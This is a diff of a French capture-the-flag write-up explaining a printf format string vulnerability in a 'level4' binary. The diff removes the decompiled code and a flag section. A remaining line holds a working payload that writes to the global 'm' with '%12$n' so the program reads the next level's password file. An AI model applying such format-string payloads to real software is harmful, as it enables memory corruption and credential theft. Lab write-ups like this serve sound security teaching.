@@ -8,28 +8,6 @@ printf les exécute au lieu de les afficher. C'est une **format string vulnerabi
 But : écrire la valeur `0x1025544` (= **16 930 116** en décimal) dans la variable
 globale `m` pour déclencher `system("/bin/cat /home/user/level5/.pass")`.
 
-## Le code (Ghidra)
-
-```c
-void main(void) {
-    n();
-    return;
-}
-
-void n(void) {
-    char local_20c [520];
-    fgets(local_20c, 0x200, stdin);   // lit 512 octets max -> PAS d'overflow possible
-    p(local_20c);                     // p() fait printf(local_20c) -> LA faille
-    if (m == 0x1025544) {             // 0x1025544 = 16 930 116
-        system("/bin/cat /home/user/level5/.pass");
-    }
-    return;
-}
-
-void p(char *str) {
-    printf(str);                      // <-- vulnérable : pas de "%s"
-}
-```
 
 Points importants :
 - `fgets(..., 0x200, ...)` limite à 512 octets → l'attaque par **buffer overflow**
@@ -237,12 +215,3 @@ python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' | ./level4
 (`16 930 112` = `16 930 116 - 4`, car l'adresse a déjà affiché 4 caractères.)
 L'approche `%hhn` ci-dessus est préférée : rapide et générale (marche même pour des
 valeurs énormes type `0xFFFFFFFF`).
-
-## Récupérer le flag
-
-Le `system()` lance directement `cat` sur le `.pass` de level5 → le mot de passe
-s'affiche dans la foulée du payload. Le noter dans `level4/flag`, puis :
-
-```bash
-su level5    # mot de passe = le flag récupéré
-```
